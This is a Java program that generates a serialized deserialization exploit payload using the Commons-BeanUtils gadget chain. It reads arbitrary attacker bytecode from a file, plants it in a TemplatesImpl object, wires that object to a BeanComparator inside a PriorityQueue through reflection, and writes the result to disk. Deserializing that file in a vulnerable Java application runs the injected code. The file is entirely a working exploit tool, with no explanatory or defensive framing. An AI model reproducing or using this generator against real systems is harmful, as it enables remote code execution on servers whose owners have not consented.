import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.ComparableComparator;
import java.lang.reflect.Field;
import java.nio.file.*;
import java.io.*;
import java.util.*;

public class GenCB1 {
    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get(args[0]));
        TemplatesImpl tpl = new TemplatesImpl();
        set(tpl, "_bytecodes", new byte[][]{evil});
        set(tpl, "_name", "x");

        BeanComparator cmp = new BeanComparator("outputProperties", new ComparableComparator());
        PriorityQueue<Object> pq = new PriorityQueue<>(2, cmp);
        Field qf = PriorityQueue.class.getDeclaredField("queue"); qf.setAccessible(true);
        qf.set(pq, new Object[]{tpl, tpl});
        Field sf = PriorityQueue.class.getDeclaredField("size"); sf.setAccessible(true);
        sf.set(pq, 2);

        try (ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(args[1]))) {
            o.writeObject(pq);
        }
        System.out.println("written " + args[1]);
    }
    static void set(Object o, String f, Object v) throws Exception {
        Field fd = o.getClass().getDeclaredField(f);
        fd.setAccessible(true);
        fd.set(o, v);
    }
}
